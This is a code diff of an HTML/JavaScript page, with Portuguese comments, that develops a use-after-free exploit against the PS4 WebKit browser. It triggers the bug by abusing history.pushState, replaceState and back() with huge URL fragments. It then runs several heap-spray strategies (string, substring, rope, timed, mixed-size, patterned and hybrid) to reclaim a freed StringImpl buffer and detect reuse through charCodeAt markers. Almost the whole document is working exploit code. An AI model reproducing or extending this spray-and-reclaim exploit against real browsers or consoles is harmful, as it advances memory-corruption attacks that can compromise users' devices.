@@ -1,102 +1,440 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>PS4 WebKit UAF – Trigger Fixado + Testes</title>
-<style>
-body { font-family: monospace; background: #000; color: #0f0; }
-button { margin: 5px; padding: 10px; }
-pre { white-space: pre-wrap; }
-</style>
+<meta charset="UTF-8">
+<title>String Buffer UAF - Slot Fixation Correto</title>
 </head>
 <body>
-
-<h2>UAF Trigger Fixado (Iteração 48)</h2>
-
+<h1>String Buffer UAF - StringImpl m_data Reuse</h1>
 <button onclick="runTest()">RUN TEST</button>
-
 <pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
-function log(s) {
-    logEl.textContent += s + "\n";
-}
+function log(m) { logEl.textContent += m + "\n"; }
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-/* ===========================
-   CONSTANTES DO BUG (FIXAS)
-   =========================== */
-const BIG_FRAGMENT_SIZE = 340356;
-const ITERATIONS = 48;
-
-/* ===========================
-   TRIGGER UAF (OBRIGATÓRIO)
-   =========================== */
+// ========================================
+// UAF TRIGGER - SEQUENCIA EXATA VALIDADA
+// ========================================
 async function triggerUAF() {
     log("=== UAF TRIGGER START ===");
-
-    const big = "A".repeat(BIG_FRAGMENT_SIZE);
-
-    /* Estado A — fragmento grande */
-    history.pushState({A:1}, "", "#" + big);
-
-    /* Estado B — fragmento pequeno (colisão) */
-    history.replaceState({B:2}, "", "#X");
-
-    /* Reentrada crítica */
-    for (let i = 0; i < ITERATIONS; i += 6) {
-        history.back();
-        await new Promise(r => setTimeout(r, 0));
-        log("[ITER " + i + "] back() async");
+    let size = 977;
+    const STEP = 14461;
+    
+    for(let i = 0; i < 48; i++) {
+        let frag = "A".repeat(size);
+        history.pushState({i: i}, "", "#" + frag);
+        history.replaceState({i: i}, "", "#" + frag.slice(0, frag.length >> 1));
+        
+        if(i % 6 === 0) {
+            setTimeout(() => history.back(), 0);
+            log("[ITER " + i + "] back() async");
+        }
+        
+        size += STEP;
+        await sleep(5);
     }
-
+    
     log(">>> UAF WINDOW <<<");
+    await sleep(120);
 }
 
-/* ===========================
-   TESTE BASE (PROBE CANÔNICO)
-   =========================== */
-function baselineProbe(tag) {
-    const s = location.href;
-    log(tag + " URL.length = " + s.length);
-    log(tag + " charCodeAt(32) = " + s.charCodeAt(32));
-    log(tag + " charCodeAt(64) = " + s.charCodeAt(64));
-    log(tag + " charCodeAt(128) = " + s.charCodeAt(128));
-    log(tag + " charCodeAt(256) = " + s.charCodeAt(256));
+// ========================================
+// ESTRATEGIA 1: STRING SPRAY (UTF-16)
+// Objetivo: Ocupar StringImpl::m_data buffer
+// ========================================
+function strategy1_stringSpray() {
+    log("\n=== STRATEGY 1: String Buffer Spray (UTF-16) ===");
+    let strings = [];
+    
+    // Strings do mesmo tamanho que o buffer liberado (~340KB)
+    // Mas usando padrão identificável
+    for(let i = 0; i < 1000; i++) {
+        // UTF-16: cada char = 2 bytes
+        // 170000 chars = ~340KB
+        let marker = String.fromCharCode(0x4141 + (i & 0xFF));
+        let pattern = marker.repeat(170000);
+        strings.push(pattern);
+    }
+    
+    log("Sprayed: " + strings.length + " large strings (~340KB each)");
+    return strings;
 }
 
-/* ===========================
-   TESTE PRINCIPAL
-   =========================== */
-async function runTest() {
+// ========================================
+// ESTRATEGIA 2: SUBSTRING VIEWS
+// Objetivo: Criar views que compartilham backing store
+// ========================================
+function strategy2_substringViews() {
+    log("\n=== STRATEGY 2: Substring Views ===");
+    let views = [];
+    
+    // Criar string grande
+    let base = "B".repeat(340000);
+    
+    // Criar múltiplas substrings (podem compartilhar m_data)
+    for(let i = 0; i < 5000; i++) {
+        let start = i % 1000;
+        views.push(base.substring(start, start + 170000));
+    }
+    
+    log("Created: " + views.length + " substring views");
+    return views;
+}
+
+// ========================================
+// ESTRATEGIA 3: ROPE STRINGS
+// Objetivo: String concatenation (rope structure)
+// ========================================
+function strategy3_ropeStrings() {
+    log("\n=== STRATEGY 3: Rope Strings ===");
+    let ropes = [];
+    
+    for(let i = 0; i < 2000; i++) {
+        let marker = String.fromCharCode(0x4343 + (i & 0xFF));
+        let part1 = marker.repeat(85000);
+        let part2 = marker.repeat(85000);
+        // Concatenação pode criar rope
+        ropes.push(part1 + part2);
+    }
+    
+    log("Created: " + ropes.length + " rope strings");
+    return ropes;
+}
+
+// ========================================
+// ESTRATEGIA 4: TIMED STRING ALLOCATION
+// Objetivo: Alocar strings NO MOMENTO EXATO do collapse
+// ========================================
+function strategy4_timedAllocation(callback) {
+    log("\n=== STRATEGY 4: Timed String Allocation ===");
+    
+    // Alocar em microtask - mesmo tick que back()
+    Promise.resolve().then(() => {
+        let timed = [];
+        let marker = String.fromCharCode(0x4444);
+        
+        for(let i = 0; i < 3000; i++) {
+            timed.push(marker.repeat(170000));
+        }
+        
+        log("Microtask: allocated " + timed.length + " strings");
+        window.__timed = timed;
+        callback();
+    });
+}
+
+// ========================================
+// ESTRATEGIA 5: MIXED SIZE STRING SPRAY
+// Objetivo: Cobrir múltiplos size classes
+// ========================================
+function strategy5_mixedSizes() {
+    log("\n=== STRATEGY 5: Mixed Size String Spray ===");
+    let mixed = [];
+    
+    // Strings de vários tamanhos próximos ao target
+    let sizes = [
+        160000,  // Menor
+        170000,  // Target
+        180000,  // Maior
+        340000   // Original size
+    ];
+    
+    for(let size of sizes) {
+        let marker = String.fromCharCode(0x4500 + size % 256);
+        for(let i = 0; i < 500; i++) {
+            mixed.push(marker.repeat(size));
+        }
+    }
+    
+    log("Mixed spray: " + mixed.length + " strings");
+    return mixed;
+}
+
+// ========================================
+// ESTRATEGIA 6: CHAR CODE PATTERN
+// Objetivo: Padrão único para detectar reuso
+// ========================================
+function strategy6_charCodePattern() {
+    log("\n=== STRATEGY 6: Char Code Pattern ===");
+    let patterns = [];
+    
+    for(let i = 0; i < 2000; i++) {
+        // Criar padrão ABCD repetido
+        let pattern = "";
+        for(let j = 0; j < 85000; j++) {
+            pattern += String.fromCharCode(
+                0x41 + (j % 4)  // A, B, C, D
+            );
+        }
+        patterns.push(pattern + pattern); // ~340KB
+    }
+    
+    log("Pattern spray: " + patterns.length + " strings");
+    return patterns;
+}
+
+// ========================================
+// DIAGNOSTICO APRIMORADO
+// ========================================
+function diagnoseStringReuse() {
+    log("\n=== DIAGNOSTIC ===");
+    log("URL.length: " + location.href.length);
+    log("hash.length: " + location.hash.length);
+    
+    // Ler caracteres específicos
+    let url = location.href;
+    let offsets = [0, 32, 64, 128, 256, 512, 1024, 4096];
+    
+    log("\nCharCode scan:");
+    let anomalies = 0;
+    for(let off of offsets) {
+        let code = url.charCodeAt(off);
+        log("  [" + off + "] = " + code + " (0x" + code.toString(16) + ")");
+        
+        // Detectar markers
+        if(code >= 0x4141 && code <= 0x4444) {
+            log("    >>> MARKER DETECTED: Strategy " + 
+                Math.floor((code - 0x4141) / 0x100 + 1));
+            anomalies++;
+        }
+        if(code >= 0x4500 && code <= 0x4600) {
+            log("    >>> SIZE MARKER (Strategy 5)");
+            anomalies++;
+        }
+        if(isNaN(code)) {
+            log("    >>> NaN - Invalid buffer!");
+            anomalies++;
+        }
+    }
+    
+    log("\n>>> ANOMALIES DETECTED: " + anomalies);
+    
+    if(anomalies > 0) {
+        log(">>> STRING BUFFER REUSE CONFIRMED!");
+    } else {
+        log(">>> No reuse detected yet");
+    }
+}
+
+// ========================================
+// TESTES INDIVIDUAIS
+// ========================================
+async function testStrategy1() {
     logEl.textContent = "";
-
-    /* BASELINE LIMPO */
-    log("=== BASELINE ===");
-    baselineProbe("[BASE]");
-
-    /* TRIGGER UAF (NÃO OPCIONAL) */
+    log("=== TEST STRATEGY 1: STRING SPRAY ===\n");
+    
     await triggerUAF();
-
-    /* LEITURA IMEDIATA (SAME FRAME) */
-    log("\n=== POST-UAF (SAME FRAME) ===");
-    baselineProbe("[POST]");
-
-    /* COLAPSO DO FRAGMENTO */
+    
     log("\n>>> FRAGMENT COLLAPSE <<<");
-    location.hash = "#Z";
-
-    /* LEITURA IMEDIATA */
-    log("\n=== POST-COLLAPSE (SAME FRAME) ===");
-    baselineProbe("[COLLAPSE]");
-
-    /* LEITURA ATRASADA */
-    await new Promise(r => setTimeout(r, 0));
-    log("\n=== POST-COLLAPSE (DELAYED) ===");
-    baselineProbe("[DELAYED]");
-
-    log("\n=== TEST END ===");
+    history.replaceState({}, "", "#X");
+    
+    let spray = strategy1_stringSpray();
+    
+    await sleep(50);
+    diagnoseStringReuse();
+    
+    window.__keep1 = spray;
+    log("\n=== END STRATEGY 1 ===");
 }
+
+async function testStrategy2() {
+    logEl.textContent = "";
+    log("=== TEST STRATEGY 2: SUBSTRING VIEWS ===\n");
+    
+    await triggerUAF();
+    
+    log("\n>>> FRAGMENT COLLAPSE <<<");
+    history.replaceState({}, "", "#X");
+    
+    let views = strategy2_substringViews();
+    
+    await sleep(50);
+    diagnoseStringReuse();
+    
+    window.__keep2 = views;
+    log("\n=== END STRATEGY 2 ===");
+}
+
+async function testStrategy3() {
+    logEl.textContent = "";
+    log("=== TEST STRATEGY 3: ROPE STRINGS ===\n");
+    
+    await triggerUAF();
+    
+    log("\n>>> FRAGMENT COLLAPSE <<<");
+    history.replaceState({}, "", "#X");
+    
+    let ropes = strategy3_ropeStrings();
+    
+    await sleep(50);
+    diagnoseStringReuse();
+    
+    window.__keep3 = ropes;
+    log("\n=== END STRATEGY 3 ===");
+}
+
+async function testStrategy4() {
+    logEl.textContent = "";
+    log("=== TEST STRATEGY 4: TIMED ALLOCATION ===\n");
+    
+    await triggerUAF();
+    
+    log("\n>>> FRAGMENT COLLAPSE <<<");
+    history.replaceState({}, "", "#X");
+    
+    strategy4_timedAllocation(() => {
+        setTimeout(() => {
+            diagnoseStringReuse();
+            log("\n=== END STRATEGY 4 ===");
+        }, 50);
+    });
+}
+
+async function testStrategy5() {
+    logEl.textContent = "";
+    log("=== TEST STRATEGY 5: MIXED SIZES ===\n");
+    
+    await triggerUAF();
+    
+    log("\n>>> FRAGMENT COLLAPSE <<<");
+    history.replaceState({}, "", "#X");
+    
+    let mixed = strategy5_mixedSizes();
+    
+    await sleep(50);
+    diagnoseStringReuse();
+    
+    window.__keep5 = mixed;
+    log("\n=== END STRATEGY 5 ===");
+}
+
+async function testStrategy6() {
+    logEl.textContent = "";
+    log("=== TEST STRATEGY 6: CHAR CODE PATTERN ===\n");
+    
+    await triggerUAF();
+    
+    log("\n>>> FRAGMENT COLLAPSE <<<");
+    history.replaceState({}, "", "#X");
+    
+    let patterns = strategy6_charCodePattern();
+    
+    await sleep(50);
+    diagnoseStringReuse();
+    
+    window.__keep6 = patterns;
+    log("\n=== END STRATEGY 6 ===");
+}
+
+// ========================================
+// TESTE CRÍTICO: WINDOW EXPLOITATION
+// ========================================
+async function testCriticalWindow() {
+    logEl.textContent = "";
+    log("=== CRITICAL WINDOW TEST ===\n");
+    log("Objetivo: Capturar o buffer ANTES do collapse completo\n");
+    
+    await triggerUAF();
+    
+    // NÃO colapsar ainda
+    log(">>> UAF WINDOW ATIVA - SEM COLLAPSE <<<");
+    
+    // Alocar strings DENTRO da janela
+    log("\n>>> STRING SPRAY NA JANELA CRITICA <<<");
+    let spray = [];
+    let marker = String.fromCharCode(0xDEAD);
+    
+    for(let i = 0; i < 3000; i++) {
+        spray.push(marker.repeat(170000));
+    }
+    
+    log("Sprayed: " + spray.length + " strings");
+    
+    // AGORA colapsar
+    await sleep(30);
+    log("\n>>> FRAGMENT COLLAPSE (DELAYED) <<<");
+    history.replaceState({}, "", "#X");
+    
+    await sleep(50);
+    diagnoseStringReuse();
+    
+    window.__critical = spray;
+    log("\n=== END CRITICAL WINDOW TEST ===");
+}
+
+// ========================================
+// TESTE HIBRIDO
+// ========================================
+async function testHybrid() {
+    logEl.textContent = "";
+    log("=== HYBRID TEST: MULTIPLE STRATEGIES ===\n");
+    
+    await triggerUAF();
+    
+    log("\n>>> FRAGMENT COLLAPSE <<<");
+    history.replaceState({}, "", "#X");
+    
+    // Aplicar múltiplas estratégias
+    log("\n>>> PHASE 1: String Spray <<<");
+    let spray1 = strategy1_stringSpray();
+    
+    await sleep(30);
+    
+    log("\n>>> PHASE 2: Mixed Sizes <<<");
+    let spray5 = strategy5_mixedSizes();
+    
+    await sleep(30);
+    
+    log("\n>>> PHASE 3: Pattern Spray <<<");
+    let spray6 = strategy6_charCodePattern();
+    
+    await sleep(50);
+    diagnoseStringReuse();
+    
+    window.__keepAll = [spray1, spray5, spray6];
+    log("\n=== END HYBRID TEST ===");
+}
+
+// ========================================
+// MENU PRINCIPAL
+// ========================================
+async function runTest() {
+    let choice = prompt(
+        "Escolha o teste:\n" +
+        "1 - String Spray (UTF-16 buffers)\n" +
+        "2 - Substring Views\n" +
+        "3 - Rope Strings\n" +
+        "4 - Timed Allocation\n" +
+        "5 - Mixed Sizes\n" +
+        "6 - Char Code Pattern\n" +
+        "7 - CRITICAL WINDOW (spray antes do collapse)\n" +
+        "8 - HYBRID (múltiplas estratégias)"
+    );
+    
+    if(choice === "1") {
+        await testStrategy1();
+    } else if(choice === "2") {
+        await testStrategy2();
+    } else if(choice === "3") {
+        await testStrategy3();
+    } else if(choice === "4") {
+        await testStrategy4();
+    } else if(choice === "5") {
+        await testStrategy5();
+    } else if(choice === "6") {
+        await testStrategy6();
+    } else if(choice === "7") {
+        await testCriticalWindow();
+    } else if(choice === "8") {
+        await testHybrid();
+    }
+}
+
+log("Ready. Click RUN TEST to begin.");
+log("\nAlvo: StringImpl::m_data buffer (~340KB UTF-16)");
+log("Markers: 0x4141-0x4444 (detectaveis via charCodeAt)");
 </script>
 
 </body>
